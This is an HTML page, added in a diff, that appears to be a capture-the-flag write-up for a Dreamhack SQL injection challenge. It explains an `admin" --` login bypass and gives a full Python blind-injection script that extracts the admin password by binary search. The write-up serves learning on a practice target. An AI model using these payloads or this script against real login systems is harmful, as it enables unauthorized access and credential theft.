@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>The problem can be viewed <a href="https://dreamhack.io/wargame/challenges/97">here</a></p>
+        <p>In the problem you must use SQL injection to somehow login as admin. We can see from examining the query 
+            <code>"select * from users where userid="{userid}" and userpassword="{userpassword}"</code> that the DB queries for any entries whose
+            userid column matches the userid and userpassword column matches the userpassword. <br>There are two ways to solves this problem.<br>
+            [1] We can do a rudamentary SQL injection of <code>admin" --</code> to comment out the userpassword matching part of the query, making the
+            DB return any entry which has "admin" as its userid part.<br>
+            [2] We can do blind sql injection to gain the password of admin piece by piece.<br>
+            Option [1] doesn't need code to be implemented and is self-explanatory so I will omit it in this write-up. Now onto method [2].<br>
+            If I pass in <code>admin" AND (SUBSTRING( (SELECT userpassword FROM users WHERE userid = 'administrator'), 1, 1) &gt;= 'm') --</code> as the userid,
+            the corresponding SQL query will be <br>
+            <code>"SELECT * FROM users WHERE userid="admin" AND (SUBSTRING((SELECT userpassword FROM users WHERE userid = 'admin'), 1, 1) &gt;= 'm') -- ..."</code><br>
+            which means to get every entry from users whose userid column is admin and the first character of the password of 'admin' is greater or equal to 'm'.
+            Since AND is more tightly bound than WHERE, and since the left operand of AND will always evaluate to true, SQL will return an entry if
+            the right operand is true, and return nothing if it is false. We could get the whole password by comparing to every single alphanumerical character with the
+            character that we want to discover in admin's password, but that would be time consuming. So instead we can use binary search to reduce the time complexity of
+            the exploit code. The exploit code is as below. Note that the password is a string of lowercase alphabet characters and digits.
+
+        </p>
+
+        <pre><code>
+#!/usr/bin/python3
+import requests
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
+
+url = "http://host3.dreamhack.games:10549/login"
+alphabet = "0123456789abcdefghijklmnopqrstuvwxyz"
+
+
+def binary_search(i):
+    l = 0
+    h = alphabet.__len__() - 1
+    res = -1
+    while h >= l:
+        m = (h+l)//2
+        payload = f"admin\" AND (SUBSTRING( (SELECT userpassword FROM users WHERE userid = 'admin'), {i}, 1) >= '{alphabet[m]}') --"
+        r = s.post("http://host3.dreamhack.games:10549/login",
+               proxies=proxies,
+               verify=False,
+               data={"userid":payload, "userpassword":"abc"})
+        if "wrong" in r.text:
+            h = m - 1
+            print(f"{payload}: h = {h} | l = {l}")
+        else:
+            res = m
+            l = m + 1
+            print(f"{payload}: h = {h} | l = {l}")
+    return res
+
+if __name__ == "__main__":
+    s = requests.Session()
+    pw = ""
+    for i in range(1, 65):
+        x = binary_search(i)
+        if x == -1: break
+        else: 
+            pw += alphabet[x]
+            print(f"password:{pw}")
+    print(pw)
+        </code></pre>
+    </main>
+</body>
+</html>
